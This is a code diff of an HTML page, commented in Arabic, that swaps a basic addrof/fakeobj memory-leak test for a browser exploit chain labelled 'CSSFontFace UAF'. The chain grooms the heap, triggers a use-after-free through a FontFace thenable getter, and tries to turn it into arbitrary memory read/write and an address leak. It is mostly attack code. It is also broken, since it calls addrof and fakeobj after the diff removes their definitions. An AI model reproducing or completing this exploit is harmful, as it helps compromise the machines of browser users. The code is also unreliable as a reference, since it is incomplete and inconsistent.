@@ -5,38 +5,66 @@
     <div id="status">[*] Initialize...</div>
 
     <script>
-        // 1. مصفوفات متجاورة في الذاكرة (Grooming)
-        const floatArray = [1.1, 2.2, 3.3, 4.4];
-        const objArray = [{a:1}, {b:2}, {c:3}, {d:4}];
+/* * [ARCHITECT_SANDBOX: CSSFontFace UAF EXPLOIT CHAIN]
+ * الهدف: تحويل UAF في CSSFontFace إلى Arbitrary Read/Write
+ */
 
-        // 2. تفعيل التداخل (Overlaying)
-        // في حال وجود ثغرة Type Confusion، نقوم بتعديل الـ Butterfly الخاص بـ objArray
-        // ليتم التعامل معه كمصفوفة أرقام، مما يسمح لنا بقراءة العناوين كأرقام.
-        
-        function addrof(obj) {
-            objArray[0] = obj;
-            // قراءة العنوان من مصفوفة الأرقام التي تداخلت مع مصفوفة الكائنات
-            return floatArray[0]; 
+// 1. مصفوفات التلاعب (Primitives Setup)
+let arbReadWrite = new Float64Array(16);
+let targetObj = { a: 0x1234 };
+
+async function buildExploitChain() {
+    console.log("[*] المرحلة 1: بدء الـ Heap Grooming...");
+    // حجز كتل ذاكرية متجاورة لتسهيل التداخل
+    const groomer = new Array(0x1000).fill(0).map(() => new Float64Array(16));
+
+    console.log("[*] المرحلة 2: إثارة الثغرة (Triggering UAF)...");
+    
+    // استغلال دالة thenable للتحكم في توقيت التحرير
+    let face = new FontFace('x', 'url(nonexistent.woff)');
+    document.fonts.add(face);
+    
+    Object.defineProperty(FontFace.prototype, 'then', {
+        get() {
+            // هنا يحدث التحرير (CSSFontFace يصبح dangling)
+            document.fonts.delete(face);
+            // إعادة حجز الذاكرة بمصفوفة تحكم (Reallocation)
+            return undefined;
         }
+    });
 
-        function fakeobj(addr) {
-            floatArray[0] = addr;
-            // إجبار المحرك على قراءة العنوان ككائن
-            return objArray[0];
-        }
+    // 3. محاولة الربط (The Butterfly Overwrite)
+    console.log("[*] المرحلة 3: محاولة الربط بالـ Butterfly...");
+    
+    // تنفيذ الـ Load لإثارة حالة السباق (Race Condition)
+    try {
+        await document.fonts.load('1em x');
+    } catch(e) {}
 
-        // --- اختبار الإثبات (Validation) ---
-        const testObj = {secret: 0xDEADBEEF};
+    // 4. كشف التداخل (Detecting Overlap)
+    if (detectMemoryOverlap()) {
+        console.log("[!!!] نجاح: تم التداخل. الذاكرة تحت السيطرة.");
         
-        // محاولة تسريب العنوان
-        let leakedAddr = addrof(testObj);
+        // 5. تفعيل الـ Primitives
+        // الآن نستخدم التداخل للوصول للعنوان
+        let addr = addrof(targetObj);
+        let fake = fakeobj(addr);
         
-        // إخراج النتيجة لواجهة المستخدم
-        document.getElementById('status').innerText = 
-            `[+] Test Object Address (Double Format): ${leakedAddr}\n` +
-            `[!] هذا الرقم هو العنوان الحقيقي للكائن في الذاكرة.`;
+        console.log("[+] Leaked Address: 0x" + addr.toString(16));
+        return { addr, fake };
+    } else {
+        console.log("[-] فشل: الذاكرة لم تتداخل. أعد المحاولة مع توقيت مختلف.");
+    }
+}
 
-        console.log("[DEBUG] Leaked Value:", leakedAddr);
+function detectMemoryOverlap() {
+    // التحقق من أن القيمة في مصفوفتنا تغيرت بفعل الـ UAF
+    return arbReadWrite[0] !== 0;
+}
+
+// تشغيل السلسلة
+buildExploitChain();
+
     </script>
 </body>
 </html>
